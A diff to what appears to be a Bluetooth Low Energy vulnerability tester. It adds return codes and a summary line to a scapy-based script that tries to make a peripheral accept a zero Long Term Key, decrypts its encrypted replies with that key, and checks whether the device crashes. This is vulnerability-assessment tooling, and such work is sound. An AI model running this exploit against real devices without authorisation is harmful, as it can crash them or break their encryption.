@@ -16,6 +16,13 @@ from scapy.utils import raw
 from timeout_lib import start_timeout, disable_timeout, update_timeout
 from Crypto.Cipher import AES
 
+RETURN_CODE_ERROR = 0
+RETURN_CODE_NOT_VULNERABLE = 1
+RETURN_CODE_VULNERABLE = 2
+RETURN_CODE_UNDEFINED = 3
+RETURN_CODE_NONE_OF_4_STATE_OBSERVED = 4
+RETURN_CODE_NOT_TESTED = 5
+
 # Default master address
 master_address = '5d:36:ac:90:0b:20'
 access_address = 0x9a328370
@@ -52,6 +59,12 @@ fragment = None
 # Autoreset colors
 colorama.init(autoreset=True)
 
+end_result = ""
+
+def set_end_result(result_code, result_data):
+    global end_result
+    end_result = "SBLEEDY_GONZALES DATA: code={code}, data={data}".format(code=result_code, data=result_data)
+
 # Get serial port from command line
 if len(sys.argv) >= 2:
     serial_port = sys.argv[1]
@@ -77,6 +90,7 @@ print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 def crash_timeout():
     print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
           ' received\nThe device may have crashed!!!')
+    set_end_result(RETURN_CODE_VULNERABLE, "The device may have crashed")
     disable_timeout('scan_timeout')
 
 
@@ -302,6 +316,7 @@ while run_script:
             # Check if peripheral accepted secure connections pairing
             if not (pkt.authentication & 0x08):
                 print(Fore.RED + 'Peripheral does not accept Secure Connections pairing\nEnding Test...')
+                set_end_result(RETURN_CODE_NOT_VULNERABLE, "Peripheral does not accept Secure Connections pairing")
                 run_script = False
                 end_connection = True
 
@@ -348,12 +363,14 @@ while run_script:
             print(
                     Fore.RED + 'Oooops, we were able to decrypt an encrypted response from the peripheral using a zero LTK\n'
                                'Zero LTK vulnerability is present. Check the zero_ltk.pcpap file for more information')
+            set_end_result(RETURN_CODE_VULNERABLE, "Decrypted an encrypted response using a zero LTK. Check zero_ltk.pcap for more info")
             end_connection = True
             driver.save_pcap()
             exit(0)
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
             print(Fore.GREEN + 'Slave rejected attack. You are safe!')
+            set_end_result(RETURN_CODE_NOT_VULNERABLE, "Slave rejected attack")
             end_connection = True
             run_script = False
 
@@ -372,3 +389,4 @@ while run_script:
     sleep(0.01)
 
 print(Fore.YELLOW + 'Script ended')
+print(end_result)
